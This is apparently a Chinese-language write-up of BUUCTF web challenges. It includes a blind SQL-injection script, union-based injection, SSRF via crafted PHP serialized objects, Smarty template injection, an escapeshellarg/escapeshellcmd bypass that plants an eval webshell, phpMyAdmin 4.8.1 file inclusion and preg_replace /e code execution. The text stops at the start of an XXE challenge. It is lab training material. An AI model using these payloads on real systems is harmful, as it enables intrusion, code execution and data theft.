<img src="/images/buuctf-web/image-20221018095142467.png" alt="image-20221018095142467" style="zoom:67%;" />

提交上述内容,返回了`id=1`时的结果 (如果`if`语句的值为1,则整体语句为`1=1`,值为`True`,也就会返回`id=1`时的查询内容,如果`if`语句的值为0,则整体语句为`1=0`,值为`False`)

>**`sql`中的`if`语句: `IF( expr1 , expr2 , expr3 )`**
>
>**如果`exp1`的值为`True`,则返回`expr2`**
>
>**如果`exp1`的值为`False`,则返回`expr3`**



利用这一点,可以使用脚本来进行盲注

```python
import requests
import string
import time
chars = "qwertyuioplkjhgfdsazxcvbnm1234567890}{"  # 返回所有可打印的字母，数字，符号的集合
# print(chars)
base_url = "http://38133c0f-4b3f-4bb9-b42b-e25804a8ce2b.node4.buuoj.cn:81/index.php"
session = requests.session()
flag = ''
for i in range(1,60):

    for c in chars:
        time.sleep(1) #防止429
        query = '1=if(ascii(substr((select(flag)from(flag)),{},1))={},1,0)'.format(i, ord(c))
        print(query)
        data = {
            'id': query
        }
        response = session.post(base_url,data=data).text
        if 'glzjin' in response:
            flag = flag+c
            print(flag)
            break
```





<br>

***

<br>

# [网鼎杯 2018]Fakebook

进去有一个注册页面,分别是`username`,`password`,`age`和`blog`三项,随便填写内容后提交显示`blog not valid`

那这里`blog`可能是要填一个博客的网址,尝试填写`www.baidu.com`,注册通过

<img src="/images/buuctf-web/image-20221018120804283-166704781973583.png" alt="image-20221018120804283" style="zoom:67%;" />

查看源码发现点击`username`那里的`abc`,会打开`view.php`,并传参`no`,这个`no`应该是用户的ID

<img src="/images/buuctf-web/image-20221018120842828-166704781973584.png" alt="image-20221018120842828" style="zoom:67%;" />

点击后进入了用户信息界面,这里应该是**后台进行了sql查询, 那么可能存在注入点.**.

查看源码后这里发现了`base64`编码后的内容:

<img src="/images/buuctf-web/image-20221018121149810.png" alt="image-20221018121149810" style="zoom:80%;" />

解码后发现是百度的源码,那么这里服务器根据`blog`中的网址去请求了网页的内容

那么同样地,如果这里填写`file://`这种读取本地文件的协议,应该也可以执行

```
http://004f0382-17c4-4956-ac3e-f59cd1962fa9.node4.buuoj.cn:81/join.php
http://004f0382-17c4-4956-ac3e-f59cd1962fa9.node4.buuoj.cn:81/login.php
```

直接在注册页提交的话会爆`not valid`无法通过:

<img src="/images/buuctf-web/image-20221018152903248-166704781973585.png" alt="image-20221018152903248" style="zoom:67%;" />

测试一下`view.php`的`no`参数是否存在注入

```
view.php?no=1' or '1'='1'#
```

出现报错,说明存在注入漏洞, 下面尝试一下`union`,存在关键词过滤

```
view.php?no=3 union select 1,2,3,4#
```

<img src="/images/buuctf-web/image-20221018122717667-166704781973586.png" alt="image-20221018122717667" style="zoom:67%;" />

经过测试,这里单独输入`1,`,`1union`,`1select`,等都会直接报错,而不会报`hack`,那么过滤关键词可能是`union select`,那么只要使用`/**/`来绕过空格就好了:

```
no=3 union/**/select 1,2,3,4#
```

可以看到这里爆了反序列化的错误:

<img src="/images/buuctf-web/image-20221018123424162-166704781973587.png" alt="image-20221018123424162" style="zoom: 80%;" />

这里先尝试用`2`这个位置继续注入看看,多获得一些信息:

```
no=3 union/**/select 1,database(),3,4#
---库名: fakebook
no=3 union/**/select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where table_schema='fakebook'#
---表名: users
no=3 union/**/select 1,group_concat(COLUMN_NAME),3,4 from information_schema.COLUMNS where table_schema='fakebook' and table_name='users'#
---列名: no,username,passwd,data
no=3 union/**/select 1,group_concat(no,',',username,',',passwd,',',data),3,4 from users#

输出:
1,  //id
abc,  //username
cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e, 
O:8:"UserInfo":3:{s:4:"name";s:3:"abc";s:3:"age";i:1234;s:4:"blog";s:13:"www.baidu.com";}

```

这里`data`输出的是一个可被反序列化的字符串, 那么还原一下这里的查询过程,应该是

传id值后, sql查询到此id对应的`data`字段值, 也就是序列化的字符串, 将这个字符串反序列化之后,将得到的各个属性值呈现在`view.php`的查询结果中,并且要去请求`blog`属性中的网址,返回网站内容

**这里访问`robots.txt`发现以下内容:**

```
User-agent: *
Disallow: /user.php.bak //有一个备份文件
```

访问并下载,打开后发现了源码:

```php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

这里得到了`UserInfo`类的源码,可以以此来构造反序列化的字符串了

另外,注意到, 上面最后的注入结果中的有四个字段, 应该正好能对上`union select`后的四个位置,其中存储序列化字符串的`data`在最后一个

```php
<?php
class UserInfo
{
    public $name = "aaa";
    public $age = 23;
    public $blog = "file:///var/www/html/flag.php";
}
$a = new UserInfo();
$b = serialize($a);
echo $b; 
?>
//运行得到用于反序列化的字符串
//O:8:"UserInfo":3:{s:4:"name";s:3:"aaa";s:3:"age";i:23;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

构造payload:

```
view.php?no=3 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"aaa";s:3:"age";i:23;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

查看源码得到编码后的flag,解码即可

<img src="/images/buuctf-web/image-20221018130216720.png" alt="image-20221018130216720" style="zoom:67%;" />



<br>

***

<br>

# [RoarCTF 2019]Easy Java

进来是一个登录页面,下面有个help,点击结果显示找不到文件:

```
java.io.FileNotFoundException:{help.docx}
```

<img src="/images/buuctf-web/image-20221018154244298-166704781973588.png" alt="image-20221018154244298" style="zoom:67%;" />

查看源码发现这里的连接是给`/Download`传一个`filename`参数,这里比较像文件包含了

```
Download?filename=help.docx
```

`GET`请求不到的话,把这里的参数换到POST中试试:

<img src="/images/buuctf-web/image-20221018154521680-166704781973589.png" alt="image-20221018154521680" style="zoom:67%;" />

成功下载了`help.docx`,结果打开之后啥也不是...

<img src="/images/buuctf-web/image-20221018154600400-166704781973590.png" alt="image-20221018154600400" style="zoom:67%;" />

但是此处的文件包含漏洞是确实存在的,可以尝试用它去下载一下其他文件

这里的网站是使用`JAVA`搭建的,这里可以尝试读取一下`WEB-INF`目录下面的文件,详见[JAVA_web](9076add.html)

```
filename=WEB-INF/web.xml
```

成功下载了`WEB-INF/web.xml`

在该文件中找到了一个名为`FlagController`的类

<img src="/images/buuctf-web/image-20221018160645549-166704781973591.png" alt="image-20221018160645549" style="zoom:67%;" />

先按照下面给的路径用浏览器访问一下试试: 这里爆了500错误,但是错误信息里给出了这个类的路径:

<img src="/images/buuctf-web/image-20221018160755237-166704781973592.png" alt="image-20221018160755237" style="zoom:67%;" />

那么还是用刚才的方法下载该文件,注意的文件后缀名是`.class`

```
filename=WEB-INF/classes/com/wm/ctf/FlagController.class
```

下载并打开后发现有一段`base64`编码: 解码后得到flag

<img src="/images/buuctf-web/image-20221018161405168-166704781973593.png" alt="image-20221018161405168" style="zoom:67%;" />

<br>

***

<br>

# [BJDCTF2020]The mystery of ip



左上角有三个链接,其中点击第一个是返回首页

<img src="/images/buuctf-web/image-20221018162320664-166704781973594.png" alt="image-20221018162320664" style="zoom:67%;" />



点击`Flag`,显示:

```
Your IP is : 10.244.80.206 
```

点击`Hint`然后查看源码: 有个没什么用的提示

<img src="/images/buuctf-web/image-20221018162600950-166704781973596.png" alt="image-20221018162600950" style="zoom:67%;" />

那么这里尝试添加以下`XFF`头字段,看看页面显示的IP会不会发生变化: 确实

<img src="/images/buuctf-web/image-20221018174802686-166704781973595.png" alt="image-20221018174802686" style="zoom:67%;" />



这里`XFF`字段的内容会被拼接到相应页面上,那么是否可以利用此来执行命令

这里的知识点是`SSTI`中的`smarty`模板注入,具体见[SSTI](47d18edd.html)



<img src="/images/buuctf-web/image-20221018175617235-166704781973597.png" alt="image-20221018175617235" style="zoom:67%;" />



直接读取flag文件:

<img src="/images/buuctf-web/image-20221018184357732-166704781973598.png" alt="image-20221018184357732" style="zoom:67%;" />



```
X-Forwarded-For:{system("cat /flag")}
```





<br>

***

<br>

# [BUUCTF 2018]Online Tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
} //传XFF字段

if(!isset($_GET['host'])) { //GET传参数host
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host); //对host字符串进行转码转义
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
    // -sT，在目标主机的日志上记录大批连接请求和错误的信息
    // -Pn，扫描之前不需要用ping命令，有些防火墙禁止使用ping命令
    // -T5，时间优化参数，-T0~5，-T0扫描端口的周期大约为5分钟，-T5大约为5秒钟
    // --host-time限制扫描时间
    // -F，快速扫描
```

这里命令的本意是让用户输入一个`IP`或者网址, 然后后台使用`nmap`对其进行扫描

因为`$host`最终会被拼接到`system`函数中,所以这里我们可以通过能够控制的`$host`变量来执行命令. 一般的思路是命令后注入的形式,例如`host`的值可以为:

```
127.0.0.1&& cat /flag
```

但是这里由于`escapeshellarg`和`escapeshellcmd`的存在, 上面这样的命令会被引号括起来,同时`&`这样的特殊符号也会在前面被加上`\`而转义(由具有逻辑意义的符号变为纯文本字符)

所以需要从其他角度来考虑如何执行命令,这里`Nmap`的 `-oG` 功能可以把执行结果输出到文件中, 那么这里就可以在`host`参数中写入一句话木马, 并通过`Namp`的输出功能将含有一句话木马代码的执行结果输出到文件中

输出文件的路径代码里也给出来了, 目录名也就是`sandbox`这个变量的值

那么不考虑`escapeshellarg`和`escapeshellcmd`的话,payload可以为:

```
?host=<?php eval($_POST[a])?> -oG a.php
这样最终执行的命令就是:
system("nmap -T5 -sT -Pn --host-timeout 2 -F <?php eval($_POST[a])?> -oG a.php");
```

但是`escapeshellarg`和`escapeshellcmd`会对传入字符串中的特殊字符进行转义,以保证传入`shell`的参数字符串是安全的

其中`escapeshellarg`会在未配对的单引号前面加上`\`,然后再在转义后的`\'`两段再加上一对单引号,最后再在整个字符串的两端加上一对单引号

`escapeshellcmd`会在下列特殊字符(包括`/`)以及不成对的单引号前面加上`\`

```
：`&#;`|*?~<>^()[]{}$\`、`\x0A` 和 `\xFF`。
```

这两者单独使用都没有问题,而当对一个字符串先使用`escapeshellarg`在使用`escapeshellcmd`处理时,就会出现漏洞

```php
<?php
    $host = $_GET['host'];
    $host1 = escapeshellarg($host);
    $host2 = escapeshellcmd($host);
    $host3 = escapeshellcmd($host1);
    $a = "nmap -T5 -sT -Pn --host-timeout 2 -F ".$host;
    $b = "nmap -T5 -sT -Pn --host-timeout 2 -F ".$host1;
    $c = "nmap -T5 -sT -Pn --host-timeout 2 -F ".$host2;
    $d = "nmap -T5 -sT -Pn --host-timeout 2 -F ".$host3;
    echo $a;
    echo '<br>';
    echo $d;
?>
/*
?host=<?php eval($_POST[a])?> -oG a.php 时输出:
nmap -T5 -sT -Pn --host-timeout 2 -F <?php eval($_POST[a])?> -oG a.php
nmap -T5 -sT -Pn --host-timeout 2 -F '\<\?php eval\(\$_POST\[a\]\)\?\> -oG a.php'
此时命令无法正确执行

?host=<?php eval($_POST[a])?> -oG a.php' 时输出:
nmap -T5 -sT -Pn --host-timeout 2 -F <?php eval($_POST[a])?> -oG a.php'
nmap -T5 -sT -Pn --host-timeout 2 -F '\<\?php eval\(\$_POST\[a\]\)\?\> -oG a.php'\\''\'

?host='<?php eval($_POST[a])?> -oG a.php'时输出:
nmap -T5 -sT -Pn --host-timeout 2 -F '<?php eval($_POST[a])?> -oG a.php'
nmap -T5 -sT -Pn --host-timeout 2 -F ''\\''\<\?php eval\(\$_POST\[a\]\)\?\> -oG a.php'\\'''

?host='<?php eval($_POST[a])?> -oG a.php '时输出(最后的引号前多了一个空格)
nmap -T5 -sT -Pn --host-timeout 2 -F '<?php eval($_POST[a])?> -oG a.php '
$b: nmap -T5 -sT -Pn --host-timeout 2 -F ''\''<?php eval($_POST[a])?> -oG a.php'\'''
$c: nmap -T5 -sT -Pn --host-timeout 2 -F '\<\?php eval\(\$_POST\[a\]\)\?\> -oG a.php'
$d: nmap -T5 -sT -Pn --host-timeout 2 -F ''\\''\<\?php eval\(\$_POST\[a\]\)\?\> -oG a.php '\\'''
这里最后我们输入的这部分字符串实际上被分成了三部分, 前面的''\\'', 中间的主体部分,后面的'\\'''. 后面这部分和主体部分中间使用空格分开了,所以不会对命令的执行造成影响.
对比这里的$b和$d, $b最外层还是有一对单引号包裹了整个字符串的,而$d中,由于前面和后面各多出了一个\,导致$d中主体部分前面和后面的单引号不再产生关联.
*/
```

那么最后的`payload`(用单引号包裹,同时后面的单引号前面加一个空格)

这里`escapeshellarg`和`escapeshellcmd`的共用实际上是帮助我们逃脱了原本`escapeshellarg`在字符串两侧加的那一对单引号的控制

```
?host='<?php eval($_POST[a])?> -oG a.php '
网页输出: 执行成功
you are in sandbox d59f507b1cb8dcb30bc5499203a99ac3Starting Nmap 7.70 ( https://nmap.org ) at 2022-10-19 03:07 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.83 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.83 seconds
```

使用蚁剑连接后在根目录找到flag:

```
http://8e45810b-81c1-4484-8dd3-e42274c1394c.node4.buuoj.cn:81/d59f507b1cb8dcb30bc5499203a99ac3/a.php
```

另外,其实如果能猜到flag的路径的话,payload直接这样写也可以:

```
?host=' <?php echo `cat /flag`;?> -oG test.php '
```

<br>

***

<br>

# [网鼎杯 2020 朱雀组]phpweb



```
Warning: date(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
2022-10-19 06:41:06 am
```

<img src="/images/buuctf-web/image-20221019144853752-166704781973599.png" alt="image-20221019144853752" style="zoom:67%;" />

```
func=date&p=Y-m-d+h:i:s+a
```

这里`func`的值改成别的:

```
func=a&p=Y-m-d+h:i:s+a
```

<img src="/images/buuctf-web/image-20221019150119174-1667047819735100.png" alt="image-20221019150119174" style="zoom:67%;" />

这里是调用了`call_user_func()`函数, 用来调用其他函数,其第一个参数是被调用的函数名, 后面的参数是要传给这个被调用函数的参数

`show_source`函数被过滤了

<img src="/images/buuctf-web/image-20221019150406768.png" alt="image-20221019150406768" style="zoom:80%;" />



尝试`highlight_file`: 成功输出了`index.php`的源码

<img src="/images/buuctf-web/image-20221019150655094-1667047819735101.png" alt="image-20221019150655094" style="zoom:67%;" />

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
//被禁用的函数
    function gettime($func, $p) {
        $result = call_user_func($func, $p); //漏洞在这里,这里$func是用户可控的,所以可以执行用户的命令
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func); //func转为小写字母
        if (!in_array($func,$disable_fun)) { //检查func中是否为禁用函数
            echo gettime($func, $p); //调用gettime
        }else {
            die("Hacker...");
        }
    }
?>
```

这里看到有定义`Test`类,并且有`__destruct`魔术方法,可能会用到**反序列化**. 同时注意到,这里如果通过`Test`类的`__destruct`来执行`func`的话,可以绕过黑名单的检测

**那么现在的思路就是给网站直接传的参数中,`func`传反序列化函数`unserialize`,`p`传一个待反序列化的字符串**

**然后后台通过`call_user_func`执行反序列化时,又会调用`__destruct`魔术方法**

**从而解析类属性中的`func`和`p`并执行,而此处的`func`(也就是我们通过构造待反序列化的字符串传的`func`)是不受黑名单控制的**

```php
<?php
class Test {
    var $p = "ls /";
    var $func = "system";
}
$a = new Test();
$b = serialize($a);
echo $b; 
?>
```

先扫描一下根目录

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
```

<img src="/images/buuctf-web/image-20221019152637740-1667047819735102.png" alt="image-20221019152637740" style="zoom:67%;" />

扫描`/tmp`目录,发现flag文件

<img src="/images/buuctf-web/image-20221019152724140-1667047819735104.png" alt="image-20221019152724140" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221019152813806-1667047819735103.png" alt="image-20221019152813806" style="zoom:67%;" />

<br>

***

<br>

# [GXYCTF2019]禁止套娃

进来看源码,抓包,啥也没有

<img src="/images/buuctf-web/image-20221019160827439.png" alt="image-20221019160827439" style="zoom:67%;" />

那就扫目录吧:

```
py dirsearch.py -u "http://6cfa03fc-73cc-475a-a1d3-cede7532f1cd.node4.buuoj.cn:81/" --delay=1
```

<img src="/images/buuctf-web/image-20221019161053431-1667047819735105.png" alt="image-20221019161053431" style="zoom:67%;" />

发现了`/.git`目录,**存在`git`泄露,通过`Githack`工具来利用**

```
 (kali上):
 python3 GitHack.py http://6cfa03fc-73cc-475a-a1d3-cede7532f1cd.node4.buuoj.cn:81/.git/
```

成功下载了`index.php`:

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        //禁用了伪协议
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            //在参数3中匹配参数1,将匹配到的内容替换为参数2
            //?R的意思是递归
            //这里参数一的正则表达式用来匹配 abc(bcd()),abc(bcd(def())) (后面还能无限递归嵌套) 这样的字符串
            //匹配到后将其替换为空,所以如果exp传了 a(b(c())); 替换之后就只剩下一个分号,才能使整个表达式为TRUE
            //所以这里很显然是需要进行无参数的RCE了
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

无参数RCE:

读取当前目录: 这里`getcwd`函数被过滤了

```
?exp=print_r(scandir(pos(localeconv())));
```

<img src="/images/buuctf-web/image-20221019175758566.png" alt="image-20221019175758566" style="zoom:67%;" />

**flag就在当前目录下,那么可以通过`array_reverse`将数组逆序,然后`next`取到下一个成员,也就是`flag.php`,最后通过`show_source`来读取就可以了.**

```
?exp=print_r(show_source(next(array_reverse(scandir(pos(localeconv()))))));
```

<img src="/images/buuctf-web/image-20221019180018891.png" alt="image-20221019180018891" style="zoom:67%;" />



<br>

***

<br>

# [BJDCTF2020]ZJCTF，不过如此

```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php   
}
else{
    highlight_file(__FILE__);
}
?>
```

第一步,让`text`参数从`data`协议的数据流中读数到"I have a dream"即可,然后`file`参数使用`php`伪协议来输出`base64`编码后的`next.php`源码:

```
http://9c3638f1-e9c9-4e78-8982-bd06c9f37d47.node4.buuoj.cn:81/?text=next.php&text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

将输出解码得到`next.php`的源码:

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag(){
	@eval($_GET['cmd']);
}
```

**这里`preg_replace`函数中, 使用了`/e`标签,意思是将完成替换后的字符串当作php代码来执行**

`strtolower("\\1")`得到得结果也就是`\\1`, 其中第一个反斜杠将第二个反斜杠转义,所以最后也就是`\1`, 这里`\1`具有特殊含义,**也就是指定第一个匹配项:**

>反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中， 所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。 缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 `\n` 访问， 其中 n 为一个标识特定缓冲区的一位或两位十进制数。

在`foreach`中,`$_GET`是一个数组, `$re`和`$str`分别是数组中的键和值

```php
$row=array('one'=>1,'two'=>2);
foreach($row as $key=>$val){
echo $key.'--'.$val;
#one--1
#two--2
```

所以综合起来看,我们如果在GET中传一个变量

**这个变量传到`complex`函数的`preg_replace`的变量名将作为匹配模式,也就是第一个参数, 变量值将作为匹配字符串,也就是第三个参数, 第一个匹配结果将被作为代码来执行**

那么这里就需要给`$str`传一个能够被执行的函数, 并且给`$re`传一个能够把整个函数名匹配到的正则表达式

那么传一下试试: 这里`\S`表示匹配任意非空白字符, `*`表示零至多次. 这里`phpinfo`外面加上括号和`$`是为了把`phpinfo()`本身当作变量来执行,否则只会把`phpinfo()`当作普通的字符串

```
http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=${phpinfo()}
```

<img src="/images/buuctf-web/image-20221019232635204-1667047819735106.png" alt="image-20221019232635204" style="zoom:67%;" />

直接写`phpinfo()`时: 这里 `preg_replace`仅仅按照`\1`的要求返回了第一项的匹配结果, 并通过`foreach`中的echo

<img src="/images/buuctf-web/image-20221019232607351-1667047819735107.png" alt="image-20221019232607351" style="zoom:67%;" />



那么接下来就可以执行命令获取`flag`了, 可以借助代码中给的`getFlag`函数 (这里最后面输出的命令是`foreach`那里输出的)

```
http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=${getFlag()}&cmd=system("ls /");
```

<img src="/images/buuctf-web/image-20221019233132811.png" alt="image-20221019233132811" style="zoom:67%;" />



```
http://976dd10f-e322-4cea-860d-3de8db5d7f26.node4.buuoj.cn:81/next.php?(\S*)=${getFlag()}&cmd=system("cat /flag");
```

<img src="/images/buuctf-web/image-20221019233442119.png" alt="image-20221019233442119" style="zoom:67%;" />

<br>

***

<br>

# [BSidesCF 2020]Had a bad day

<img src="/images/buuctf-web/image-20221019235152219-1667047819735108.png" alt="image-20221019235152219" style="zoom:50%;" />



这里分别点击两个连接,会通过GET来传参

<img src="/images/buuctf-web/image-20221019235244100-1667047819735109.png" alt="image-20221019235244100" style="zoom:67%;" />

尝试修改一下参数的值:

<img src="/images/buuctf-web/image-20221019235321272-1667047819735110.png" alt="image-20221019235321272" style="zoom: 67%;" />



当参数值中仍然包含`woofers`或者`meowers`但是后面加上其他字符时: 出现了报错:

<img src="/images/buuctf-web/image-20221019235442137-1667047819735111.png" alt="image-20221019235442137" style="zoom: 80%;" />



那么可以发现这里的逻辑实际上是先使用`strpos`函数来检测传的参数值中是否包括了`woofers`或者`meowers`,如果不包括则返回上上个页面,如果包括了,则在参数值后面加上`.php`然后去`include`包含这个`xxx.php`的文件. 这里由于传的是`wooferssss`,而包含的时候又找不到`wooferssss.php`自然就报错了

那么知道了是文件包含,使用伪协议就好了,先输出一下`index.php`的源码: 注意这里会在结尾自动加`.php`

```
http://277e962e-4d21-4394-b91b-5aca2d6aba9e.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index
```

将输出的`base64`编码解码后得到: 

```php
<?php
	$file = $_GET['category'];
	if(isset($file)){
		if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos($file, "index")){
			include ($file . '.php');
		}
		else{
			echo "Sorry, we currently only support woofers and meowers.";
		}
	}
?>
```

要想实现包含, 参数里必须包含`woofers`或者`meowers`或者`index`

**这里有个小技巧,`php`伪协议中,在任意位置套一层其他协议,虽然可能会产生报错,但是不影响输出,(无法找到对应的过滤器时就会跳过它)例如:**

```
?category=php://filter/meowers/read=convert.base64-encode/resource=flag
?category=php://filter/read=convert.base64-encode/meowers/resource=flag
//这里并不存在的'meowers'可以放在任意位置
```

<img src="/images/buuctf-web/image-20221020001536369.png" alt="image-20221020001536369" style="zoom:80%;" />

解码出来就得到flag了.



<br>

***

<br>

# [GWCTF 2019]我有一个数据库

发现存在`robots.txt`,不过看了下`phpinfo.php`,也没啥提示

<img src="/images/buuctf-web/image-20221020090457446.png" alt="image-20221020090457446" style="zoom:67%;" />

`dirsearch`扫到了`phpmyadmin`目录:

<img src="/images/buuctf-web/image-20221020091257148.png" alt="image-20221020091257148" style="zoom:67%;" />

这里发现`phpmyadmin`的版本只有4.8.1

<img src="/images/buuctf-web/image-20221020092057719.png" alt="image-20221020092057719" style="zoom:80%;" />

这里总结了`phpmyadmin`各个版本的漏洞:https://www.cnblogs.com/liliyuanshangcao/p/13815242.html#_label2_0

其中4.8.1可利用的有`CVE-2018-12613：后台文件包含`

SQL执行,将PHP代码写入`Session`文件中

```
select "<?php eval($_GET['a']);?>"
```

<img src="/images/buuctf-web/image-20221020094425642.png" alt="image-20221020094425642" style="zoom:80%;" />

接下来包含这个`Session`文件: 这里的`835v7i8inaavcmf1so2dg88flm`是`phpmyadmin`的`cookie`值

```
http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&a=system("ls /");
```

<img src="/images/buuctf-web/image-20221020094618243-1667047819735112.png" alt="image-20221020094618243" style="zoom:67%;" />

然后就可以上传的一句话木马执行任意命令了:

```
http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&a=system("ls /");
http://2c86d745-3121-4e69-aad4-eb54c6866105.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_835v7i8inaavcmf1so2dg88flm&a=system("cat /flag");
```

<img src="/images/buuctf-web/image-20221020094219846-1667047819735113.png" alt="image-20221020094219846" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221020094320734-1667047819735114.png" alt="image-20221020094320734" style="zoom:67%;" />



<br>

***

<br>

# [BJDCTF2020]Mark loves cat



<img src="/images/buuctf-web/image-20221020102354830-1667047819735115.png" alt="image-20221020102354830" style="zoom: 50%;" />

<img src="/images/buuctf-web/image-20221020102429804-1667047819735116.png" alt="image-20221020102429804" style="zoom:67%;" />

`dirsearch`扫描,发现`.git`泄露:

<img src="/images/buuctf-web/image-20221020102729256.png" alt="image-20221020102729256" style="zoom:67%;" />

使用`githack`工具进行利用:

```
 python3 GitHack.py http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/.git/
```

能够扫到`flag.php`和`index.php`,但是有概率扒不下来,执行一下`git init`,再多尝试几次就好了:

<img src="/images/buuctf-web/image-20221020104605588.png" alt="image-20221020104605588" style="zoom:80%;" />

```php
//flag.php:
<?php
$flag = file_get_contents('/flag');

//index.php
<?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';
foreach($_POST as $x => $y){
    $$x = $y;
}
foreach($_GET as $x => $y){
    $$x = $$y;
}
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;
```

这里是变量覆盖: 思路就是直接**用get传参数把$flag的值放到其他变量中，输出对应的变量**。

```
如果选择在第23行的exit处输出flag: 
需要把$yds覆盖成$flag, 且GET和POST中都不传flag
http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/index.php?yds=flag
这样不传POST就行了

如果选择在第26行的exit处输出flag:
需要将$is覆盖成$flag, 且有$_POST['flag'] === 'flag'或者$_GET['flag'] === 'flag'
这里如果传$_POST['flag'] === 'flag'会导致flag变量被覆盖,所以依然在get中传这个参数:
http://34ffe92e-2746-4479-92f2-ca5c64d7195e.node4.buuoj.cn:81/index.php?is=flag&flag=flag

如果在最后输出flag,想了半天没想出来..
```



<br>

***

<br>



# [NCTF2019]Fake XML cookbook

<img src="/images/buuctf-web/image-20221020114653824-1667047819735117.png" alt="image-20221020114653824" style="zoom:67%;" />

看源码,用户提交的数据被拼接成了`XML`数据,这里可能会考`xxe`

抓包发现`username`中的内容能够回显

payload:

```
<?xml version="1.0" ?>
